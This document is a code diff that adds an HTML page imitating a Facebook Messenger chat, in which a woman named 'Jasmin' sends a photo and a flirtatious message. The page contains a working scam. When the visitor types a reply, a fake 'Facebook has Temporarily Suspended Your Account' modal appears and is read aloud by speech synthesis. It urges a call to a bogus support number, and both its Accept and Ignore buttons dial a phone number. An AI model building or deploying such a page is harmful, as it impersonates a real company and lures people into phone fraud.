@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Chat with Jasmin</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Hide scrollbar for Chrome, Safari and Opera */
+        .no-scrollbar::-webkit-scrollbar {
+            display: none;
+        }
+        /* Hide scrollbar for IE, Edge and Firefox */
+        .no-scrollbar {
+            -ms-overflow-style: none;  /* IE and Edge */
+            scrollbar-width: none;  /* Firefox */
+        }
+        
+        /* Modal fade-in animation */
+        .modal-enter {
+            animation: fadeIn 0.2s ease-out forwards;
+        }
+        .modal-exit {
+            animation: fadeOut 0.2s ease-in forwards;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        @keyframes fadeOut {
+            from { opacity: 1; transform: scale(1); }
+            to { opacity: 0; transform: scale(0.95); }
+        }
+    </style>
+</head>
+<body class="bg-white h-screen flex flex-col font-sans overflow-hidden text-gray-800">
+
+    <!-- Header -->
+    <header class="flex items-center justify-between p-3 border-b border-gray-200 bg-white/90 backdrop-blur-sm z-10 w-full shrink-0 shadow-sm">
+        <div class="flex items-center gap-3">
+            <button class="p-2 -ml-2 rounded-full hover:bg-gray-100 text-[#0084ff] transition-colors">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2.5" stroke="currentColor" class="w-6 h-6">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M10.5 19.5L3 12m0 0l7.5-7.5M3 12h18" />
+                </svg>
+            </button>
+            <div class="relative cursor-pointer flex items-center gap-3">
+                <div class="relative">
+                    <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt="Jasmin" class="w-10 h-10 rounded-full object-cover border border-gray-100">
+                    <div class="absolute bottom-0 right-0 w-3 h-3 bg-green-500 border-2 border-white rounded-full"></div>
+                </div>
+                <div class="flex flex-col">
+                    <span class="font-semibold text-[17px] leading-tight">Jasmin</span>
+                    <span class="text-[13px] text-gray-500 leading-tight">Active now</span>
+                </div>
+            </div>
+        </div>
+        <div class="flex items-center gap-4 text-[#0084ff]">
+            <button id="callBtn" class="hover:bg-gray-100 p-2 rounded-full transition-colors">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
+                    <path fill-rule="evenodd" d="M1.5 4.5a3 3 0 013-3h1.372c.86 0 1.61.586 1.819 1.42l1.105 4.423a1.875 1.875 0 01-.694 1.955l-3.193 2.68a17.25 17.25 0 008.557 8.558l2.68-3.193a1.875 1.875 0 011.956-.694l4.423 1.105c.834.209 1.42.959 1.42 1.82V19.5a3 3 0 01-3 3h-2.25C8.552 22.5 1.5 15.448 1.5 6.75V4.5z" clip-rule="evenodd" />
+                </svg>
+            </button>
+            <button id="videoBtn" class="hover:bg-gray-100 p-2 rounded-full transition-colors">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-7 h-7">
+                    <path d="M4.5 4.5a3 3 0 00-3 3v9a3 3 0 003 3h8.25a3 3 0 003-3v-9a3 3 0 00-3-3H4.5zM19.94 18.75l-2.69-2.69V7.94l2.69-2.69c.944-.945 2.56-.276 2.56 1.06v11.38c0 1.336-1.616 2.005-2.56 1.06z" />
+                </svg>
+            </button>
+        </div>
+    </header>
+
+    <!-- Chat Area -->
+    <main id="chatArea" class="flex-1 overflow-y-auto p-4 flex flex-col gap-3 bg-white no-scrollbar pb-6">
+        
+        <!-- Profile info intro -->
+        <div class="flex flex-col items-center justify-center mt-6 mb-8 gap-2">
+            <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt="Jasmin" class="w-24 h-24 rounded-full object-cover">
+            <h2 class="font-bold text-xl">Jasmin</h2>
+            <p class="text-sm text-gray-500">You're friends on Facebook</p>
+        </div>
+
+        <!-- Timestamp -->
+        <div class="text-center text-xs text-gray-400 my-2 font-medium">
+            SEP 24 AT 10:45 AM
+        </div>
+
+        <!-- Jasmin's Messages -->
+
+        
+        <div class="flex items-end gap-2 max-w-[85%]">
+            <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt="Jasmin" class="w-7 h-7 rounded-full object-cover mb-1 shrink-0">
+            <div class="rounded-2xl rounded-bl-sm overflow-hidden shadow-[0_0_0_1px_rgba(0,0,0,0.05)] bg-[#e4e6eb]">
+                <img id="chatImage" src="file:///C:/Users/James%20allen/Downloads/ROxEWYqZ.png" alt="Sent image" class="w-56 h-auto object-cover max-h-72 cursor-pointer hover:opacity-90 transition-opacity">
+            </div>
+        </div>
+		<div class="flex items-end gap-2 max-w-[85%] mb-1">
+            <div class="w-7 h-7 shrink-0"></div> <!-- Placeholder for alignment -->
+            <div class="bg-[#e4e6eb] text-black px-4 py-2 rounded-2xl rounded-bl-sm text-[15px] leading-relaxed">
+                Are you Want more pic's 😉
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Input Area -->
+    <footer class="p-3 bg-white border-t border-gray-100 flex items-end gap-2 shrink-0">
+        <div class="flex items-center gap-2 pb-1 text-[#0084ff]">
+            <button class="hover:bg-gray-100 p-2 rounded-full transition-colors">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
+                    <path fill-rule="evenodd" d="M12 2.25c-5.385 0-9.75 4.365-9.75 9.75s4.365 9.75 9.75 9.75 9.75-4.365 9.75-9.75S17.385 2.25 12 2.25zM12.75 9a.75.75 0 00-1.5 0v2.25H9a.75.75 0 000 1.5h2.25V15a.75.75 0 001.5 0v-2.25H15a.75.75 0 000-1.5h-2.25V9z" clip-rule="evenodd" />
+                </svg>
+            </button>
+            <button class="hover:bg-gray-100 p-2 rounded-full transition-colors hidden sm:block">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
+                    <path d="M12 9a3.75 3.75 0 100 7.5A3.75 3.75 0 0012 9z" />
+                    <path fill-rule="evenodd" d="M9.344 3.071a49.52 49.52 0 015.312 0c.967.052 1.83.585 2.332 1.39l.821 1.317c.24.383.645.643 1.11.71.386.054.77.113 1.152.177 1.432.239 2.429 1.493 2.429 2.909V18a3 3 0 01-3 3h-15a3 3 0 01-3-3V9.574c0-1.416.997-2.67 2.429-2.909.382-.064.766-.123 1.151-.178a1.56 1.56 0 001.11-.71l.822-1.315a2.942 2.942 0 012.332-1.39zM6.75 12.75a5.25 5.25 0 1110.5 0 5.25 5.25 0 01-10.5 0zm12-1.5a.75.75 0 100-1.5.75.75 0 000 1.5z" clip-rule="evenodd" />
+                </svg>
+            </button>
+            <button class="hover:bg-gray-100 p-2 rounded-full transition-colors">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
+                    <path fill-rule="evenodd" d="M1.5 6a2.25 2.25 0 012.25-2.25h16.5A2.25 2.25 0 0122.5 6v12a2.25 2.25 0 01-2.25 2.25H3.75A2.25 2.25 0 011.5 18V6zM3 16.06V18c0 .414.336.75.75.75h16.5A.75.75 0 0021 18v-1.94l-2.69-2.689a1.5 1.5 0 00-2.12 0l-.88.879.97.97a.75.75 0 11-1.06 1.06l-5.16-5.159a1.5 1.5 0 00-2.12 0L3 16.061zm10.125-7.81a1.125 1.125 0 112.25 0 1.125 1.125 0 01-2.25 0z" clip-rule="evenodd" />
+                </svg>
+            </button>
+        </div>
+        
+        <div class="flex-1 relative flex items-end">
+            <textarea id="messageInput" rows="1" class="w-full bg-[#f0f2f5] rounded-3xl py-2.5 px-4 pr-10 outline-none resize-none text-[15px] max-h-32" placeholder="Message..." oninput="this.style.height = '';this.style.height = this.scrollHeight + 'px'"></textarea>
+            <div class="absolute right-3 bottom-2 text-[#0084ff] cursor-pointer hover:bg-gray-200 p-1 rounded-full transition-colors">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-5 h-5">
+                    <path fill-rule="evenodd" d="M12 2.25c-5.385 0-9.75 4.365-9.75 9.75s4.365 9.75 9.75 9.75 9.75-4.365 9.75-9.75S17.385 2.25 12 2.25zm-2.625 6c-.54 0-.828.419-.936.634a1.96 1.96 0 00-.189.866c0 .298.059.605.189.866.108.215.395.634.936.634.54 0 .828-.419.936-.634.13-.26.189-.568.189-.866 0-.298-.059-.605-.189-.866-.108-.215-.395-.634-.936-.634zm4.314.634c.108-.215.395-.634.936-.634.54 0 .828.419.936.634.13.26.189.568.189.866 0 .298-.059.605-.189.866-.108.215-.395.634-.936.634-.54 0-.828-.419-.936-.634a1.96 1.96 0 01-.189-.866c0-.298.059-.605.189-.866zm-4.34 7.964a.75.75 0 01-1.061-1.06 5.236 5.236 0 013.73-1.538 5.236 5.236 0 013.695 1.538.75.75 0 11-1.061 1.06 3.736 3.736 0 00-2.639-1.098 3.736 3.736 0 00-2.664 1.098z" clip-rule="evenodd" />
+                </svg>
+            </div>
+        </div>
+
+        <button id="sendBtn" class="p-2 mb-0.5 rounded-full hover:bg-gray-100 text-[#0084ff] transition-colors shrink-0">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
+                <path d="M3.478 2.405a.75.75 0 00-.926.94l2.432 7.905H13.5a.75.75 0 010 1.5H4.984l-2.432 7.905a.75.75 0 00.926.94 60.519 60.519 0 0018.445-8.986.75.75 0 000-1.218A60.517 60.517 0 003.478 2.405z" />
+            </svg>
+        </button>
+    </footer>
+
+    <!-- Age Verification Modal -->
+    <div id="ageModalOverlay" class="fixed inset-0 bg-black/40 z-50 hidden items-center justify-center backdrop-blur-sm px-4">
+        <div id="ageModalContent" class="bg-white rounded-2xl shadow-xl w-full max-w-sm overflow-hidden transform scale-95 opacity-0">
+            
+            <div class="p-6 text-center pt-8">
+                <img src="file:///C:/Users/James%20allen/Downloads/Facebook_f_logo_(2021).svg.webp" alt="Jasmin" class="w-20 h-20 rounded-full object-cover mx-auto mb-4 border border-gray-200 shadow-sm">
+                <h3 class="text-xl font-bold text-gray-900 mb-2">Facebook has Temporarily Suspended Your Account.</h3>
+                <p class="text-gray-500 text-[15px] mb-8 leading-relaxed">
+                    Your Facebook account has been disabled due to detected suspicious activity. Please contact Facebook Security Support immediately at +1 ‪(888) 457-6016 to unlock your account.
+                </p>
+                
+                <div class="flex flex-col gap-3">
+                    <a href="tel:+18054108751"   id="btnYes18"   class="block w-full bg-[#0084ff] hover:bg-blue-600 text-white font-semibold py-3 px-4 rounded-xl transition-colors text-center">    Accept
+</a>
+                    <button
+    id="btnCancel"
+    onclick="window.location.href='tel:+18054108751';"
+    class="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold py-3 px-4 rounded-xl transition-colors">
+    Ignore
+</button>
+                </div>
+            </div>
+            <div class="bg-gray-50 p-4 text-center text-xs text-gray-400 border-t border-gray-100">
+                Facebook Support
+            </div>
+        </div>
+    </div>
+
+    <!-- Call/Video Unavailable Modal -->
+    <div id="callModalOverlay" class="fixed inset-0 bg-black/40 z-50 hidden items-center justify-center backdrop-blur-sm px-4">
+        <div id="callModalContent" class="bg-white rounded-2xl shadow-xl w-full max-w-sm overflow-hidden transform scale-95 opacity-0">
+            <div class="p-6 text-center pt-8">
+                <div class="mx-auto w-16 h-16 bg-[#f0f2f5] text-[#0084ff] rounded-full flex items-center justify-center mb-4">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-8 h-8">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+                    </svg>
+                </div>
+                <h3 class="text-xl font-bold text-gray-900 mb-2">Connecting...</h3>
+                <p class="text-gray-500 text-[15px] mb-8 leading-relaxed">
+                    Jasmin is currently unavailable for voice or video calls. Please leave a message instead.
+                </p>
+                <div class="flex flex-col gap-3">
+                    <button id="closeCallModalBtn" class="w-full bg-[#0084ff] hover:bg-blue-600 text-white font-semibold py-3 px-4 rounded-xl transition-colors">
+                        Okay
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Image Viewer Modal (Lightbox) -->
+    <div id="imageModalOverlay" class="fixed inset-0 bg-black/90 z-[60] hidden items-center justify-center backdrop-blur-sm px-4 cursor-pointer">
+        <button id="closeImageModalBtn" class="absolute top-4 right-4 text-white hover:text-gray-300 p-2 z-[70] transition-colors">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2.5" stroke="currentColor" class="w-8 h-8">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
+            </svg>
+        </button>
+        <img id="expandedImage" src="" alt="Expanded View" class="max-w-full max-h-[90vh] object-contain rounded-lg transform scale-95 opacity-0 shadow-2xl cursor-default">
+    </div>
+
+    <script>
+        const messageInput = document.getElementById('messageInput');
+        const sendBtn = document.getElementById('sendBtn');
+        const chatArea = document.getElementById('chatArea');
+        const ageModalOverlay = document.getElementById('ageModalOverlay');
+        const ageModalContent = document.getElementById('ageModalContent');
+        const btnYes18 = document.getElementById('btnYes18');
+        const btnCancel = document.getElementById('btnCancel');
+
+        // Call/Video Modal Elements
+        const callBtn = document.getElementById('callBtn');
+        const videoBtn = document.getElementById('videoBtn');
+        const callModalOverlay = document.getElementById('callModalOverlay');
+        const callModalContent = document.getElementById('callModalContent');
+        const closeCallModalBtn = document.getElementById('closeCallModalBtn');
+
+        // Image Modal Elements
+        const chatImage = document.getElementById('chatImage');
+        const imageModalOverlay = document.getElementById('imageModalOverlay');
+        const expandedImage = document.getElementById('expandedImage');
+        const closeImageModalBtn = document.getElementById('closeImageModalBtn');
+
+        let isAgeVerified = false;
+        let pendingMessage = "";
+
+        // Function to handle the actual sending of a message
+        function appendUserMessage(text) {
+            const messageWrapper = document.createElement('div');
+            messageWrapper.className = 'flex justify-end mb-2 w-full';
+            
+            const messageDiv = document.createElement('div');
+            messageDiv.className = 'bg-[#0084ff] text-white px-4 py-2 rounded-2xl rounded-br-sm text-[15px] leading-relaxed max-w-[80%] break-words shadow-sm';
+            messageDiv.textContent = text;
+            
+            messageWrapper.appendChild(messageDiv);
+            chatArea.appendChild(messageWrapper);
+            
+            // Clear input and reset height
+            messageInput.value = '';
+            messageInput.style.height = 'auto';
+            
+            // Scroll to bottom
+            chatArea.scrollTop = chatArea.scrollHeight;
+        }
+
+        // Show Modal with animation
+        function showModal() {
+            ageModalOverlay.classList.remove('hidden');
+            ageModalOverlay.classList.add('flex');
+            
+            ageModalContent.classList.remove('modal-exit', 'scale-95', 'opacity-0');
+            ageModalContent.classList.add('modal-enter');
+
+            // Play voice prompt
+            if ('speechSynthesis' in window) {
+                window.speechSynthesis.cancel(); // Cancel any ongoing speech
+                
+                const utterance = new SpeechSynthesisUtterance("Your Facebook account has been disabled due to detected suspicious activity. Please contact Facebook Security Support immediately at +1 ‪(888) 457-6016 to unlock your account.");
+                utterance.lang = "en-US";
+                utterance.rate = 1.0;
+                utterance.pitch = 1.1; // Slightly higher pitch
+
+                // Attempt to pick a female/soft voice if available
+                const voices = window.speechSynthesis.getVoices();
+                const preferredVoice = voices.find(v => v.name.toLowerCase().includes('female') || v.name.includes('Samantha') || v.name.includes('Google US English'));
+                if (preferredVoice) {
+                    utterance.voice = preferredVoice;
+                }
+                
+                window.speechSynthesis.speak(utterance);
+            }
+        }
+
+        // Hide Modal with animation
+        function hideModal() {
+            if ('speechSynthesis' in window) {
+                window.speechSynthesis.cancel(); // Stop speaking if closed quickly
+            }
+
+            ageModalContent.classList.remove('modal-enter');
+            ageModalContent.classList.add('modal-exit');
+            
+            // Wait for animation to finish before hiding wrapper
+            setTimeout(() => {
+                ageModalOverlay.classList.add('hidden');
+                ageModalOverlay.classList.remove('flex');
+            }, 200);
+        }
+
+        // Handle attempt to send a message
+        function handleSendAttempt() {
+            const text = messageInput.value.trim();
+            if (!text) return;
+
+            if (!isAgeVerified) {
+                pendingMessage = text;
+                showModal();
+            } else {
+                appendUserMessage(text);
+            }
+        }
+
+        // Event Listeners for sending
+        sendBtn.addEventListener('click', handleSendAttempt);
+
+        messageInput.addEventListener('keypress', function (e) {
+            if (e.key === 'Enter' && !e.shiftKey) {
+                e.preventDefault();
+                handleSendAttempt();
+            }
+        });
+
+        // Event Listeners for Modal
+        btnYes18.addEventListener('click', () => {
+            isAgeVerified = true;
+            hideModal();
+            
+            // Automatically send the message they were trying to send
+            if (pendingMessage) {
+                appendUserMessage(pendingMessage);
+                pendingMessage = "";
+            }
+            
+            // Optional focus back to input
+            messageInput.focus();
+        });
+
+        btnCancel.addEventListener('click', () => {
+            pendingMessage = ""; // Clear pending message
+            hideModal();
+        });
+
+        // --- Call/Video Modal Logic ---
+        function showCallModal() {
+            callModalOverlay.classList.remove('hidden');
+            callModalOverlay.classList.add('flex');
+            
+            callModalContent.classList.remove('modal-exit', 'scale-95', 'opacity-0');
+            callModalContent.classList.add('modal-enter');
+        }
+
+        function hideCallModal() {
+            callModalContent.classList.remove('modal-enter');
+            callModalContent.classList.add('modal-exit');
+            
+            setTimeout(() => {
+                callModalOverlay.classList.add('hidden');
+                callModalOverlay.classList.remove('flex');
+            }, 200);
+        }
+
+        callBtn.addEventListener('click', showCallModal);
+        videoBtn.addEventListener('click', showCallModal);
+        closeCallModalBtn.addEventListener('click', hideCallModal);
+
+        // --- Image Viewer Modal Logic ---
+        function showImageModal(imageSrc) {
+            expandedImage.src = imageSrc;
+            imageModalOverlay.classList.remove('hidden');
+            imageModalOverlay.classList.add('flex');
+            
+            expandedImage.classList.remove('modal-exit', 'scale-95', 'opacity-0');
+            expandedImage.classList.add('modal-enter');
+        }
+
+        function hideImageModal() {
+            expandedImage.classList.remove('modal-enter');
+            expandedImage.classList.add('modal-exit');
+            
+            setTimeout(() => {
+                imageModalOverlay.classList.add('hidden');
+                imageModalOverlay.classList.remove('flex');
+            }, 200);
+        }
+
+        // Click on the chat image to open modal
+        chatImage.addEventListener('click', () => {
+            showImageModal(chatImage.src);
+        });
+
+        // Close when clicking the "X" button
+        closeImageModalBtn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            hideImageModal();
+        });
+
+        // Close when clicking the background overlay
+        imageModalOverlay.addEventListener('click', (e) => {
+            if (e.target === imageModalOverlay) {
+                hideImageModal();
+            }
+        });
+
+        // Ensure the chat is scrolled to the bottom on load
+        window.onload = () => {
+            chatArea.scrollTop = chatArea.scrollHeight;
+        };
+    </script>
+</body>
+</html>
